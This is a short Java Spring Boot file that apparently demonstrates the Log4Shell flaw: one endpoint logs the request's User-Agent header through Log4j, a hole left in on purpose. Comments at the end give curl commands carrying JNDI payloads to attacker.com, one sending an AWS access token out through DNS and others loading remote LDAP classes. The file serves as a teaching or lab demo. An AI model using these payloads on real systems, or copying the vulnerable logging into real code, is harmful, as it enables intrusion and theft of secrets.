package com.example.experiment04;

import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;
import javax.servlet.http.HttpServletRequest;

import static org.springframework.http.ResponseEntity.ok;

@SpringBootApplication
@RestController
@Configuration
@Slf4j
public class Experiment04Application {

    public static void main(String[] args) {
        SpringApplication.run(Experiment04Application.class, args);
    }

    @GetMapping(path = "/")
    ResponseEntity<String> getUserAgent(HttpServletRequest request) {

        log.info("User Agent from headers: {}", request.getHeader("User-Agent"));

        return ok().body("Hello Log4j");
    }
}

// curl localhost:8080 -H "User-Agent: user-agent-text"
// curl localhost:8080 -H "User-Agent: \${env:AWS_ACCESS_TOKEN}"

// curl localhost:8080 -H "User-Agent: \${jndi:dns://attacker.com/hello-tln}"
// curl localhost:8080 -H "User-Agent: \${jndi:dns://attacker.com/aws-token.\${env:AWS_ACCESS_TOKEN}.exploit.com}"

// curl localhost:8080 -H "User-Agent: \${jndi:ldap://attacker.com:389/Calculator}"
// curl localhost:8080 -H "User-Agent: \${jndi:ldap://attacker.com:389/YouTube}"